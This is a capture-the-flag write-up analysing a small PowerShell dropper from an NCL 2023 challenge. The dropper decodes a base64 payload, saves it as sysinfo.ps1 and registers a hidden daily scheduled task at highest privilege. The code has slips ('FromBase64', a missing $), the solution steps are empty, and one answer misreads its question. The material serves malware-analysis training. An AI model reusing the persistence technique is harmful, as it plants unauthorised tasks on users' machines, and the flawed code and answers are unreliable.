# CTF Writeup: NCL Spring 2023 Individual Game

## Challenge Name: Dropper (Easy)

### Challenge Description:

We manged to find this sample of malware. What can you tell us about it?

```
$user = $env:UserName
$p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64("U3RhcnQtU2xlZXAgLVNlY29uZHMgMjUwCkdldC1DaW1JbnN0YW5jZSAtQ2xhc3NOYW1lIFdpbjMyX1F1aWNrRml4RW5naW5lZXJpbmcgPiBDOlxpbmZvCg=="))
$path =  "C:\Users\$user\sysinfo.ps1"
$p | Out-File -FilePath $path

$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$actions = (New-ScheduledTaskAction -Execute $path)

$trigger = New-ScheduledTaskTrigger -Daily -At '12:00pm'
$principal = New-ScheduledTaskPrincipal -UserId $user -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun
$task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings settings

Register-ScheduledTask 'Sys Info' -InputObject $task
```

### Challenge Questions:

1. What language is the dropper script written in?
2. What time of day will the malware run its payload?
3. What is the name of the file the payload is saved as?
4. What path does the payload save information to?
5. How many seconds does the payload stay dormant?
6. What CIM class is it looking at?


### Solution:



#### Step 1: Identify the format of the document information



#### Step 2: Use a decoder to decode the document information



#### Step 3: Provide answers to the challenge questions

#### Final Answer
1. PowerShell
2. 12:00
3. C:\Users\$user\sysinfo.ps1
4. C:\info
5. 250
6. Win32_QuickFixEngineering


## Conclusion:

## Excerpts from Methodologies and techhniques used from NCL Discord
`Really easy: Base64 decode the string to know what it calls.: Everything else can be explained in plaintext`